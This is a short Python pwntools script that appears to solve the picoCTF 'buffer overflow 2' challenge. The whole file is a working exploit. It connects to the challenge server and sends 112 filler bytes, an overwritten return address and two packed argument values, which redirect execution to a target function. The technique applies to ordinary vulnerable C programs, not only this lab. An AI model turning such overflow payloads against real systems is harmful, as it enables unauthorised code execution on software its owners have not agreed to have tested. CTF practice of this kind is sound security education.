# buffer overflow 2 solution

from pwn import *
#context.log_level = "debug" 

dest = p32(134517398)     #0x96920408
arg1 = p32(3405705229)    #0x0df0feca
arg2 = p32(4027445261)    #0x0df00df0

# Connect to remote app
s = remote('saturn.picoctf.net', 64246, timeout=5)


recv = s.recvline()
#print(recv.decode('utf-8'))

payload = (b'\x43' * 112) + dest + (b'\x43' * 4) + arg1 + arg2 + b'\n'

s.send(payload)
resp = s.recvall()
s.close()

print(resp)

